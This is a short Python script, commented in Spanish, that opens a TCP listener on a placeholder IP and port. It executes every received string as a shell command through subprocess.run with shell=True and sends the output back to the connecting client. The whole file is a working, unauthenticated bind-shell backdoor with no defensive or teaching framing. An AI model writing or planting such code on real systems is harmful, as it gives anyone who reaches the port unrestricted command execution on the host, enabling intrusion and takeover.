import socket
import subprocess

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#Ejemplo: server_socket.bind(("255.255.255.255", 5000))
server_socket.bind(("IP", PUERTO))
server_socket.listen(1)
print("Esperando conexión...")

client_socket, client_address = server_socket.accept()
print(f"Cliente conectado desde {client_address}")     
                                                   


while True:

    comando = client_socket.recv(1024).decode()
    if comando.lower() == "exit":
        break

    resultado = subprocess.run(comando, shell=True, capture_output=True, text=True)

    salida = resultado.stdout + resultado.stderr
    
    client_socket.send(salida.encode())

client_socket.close()
server_socket.close()





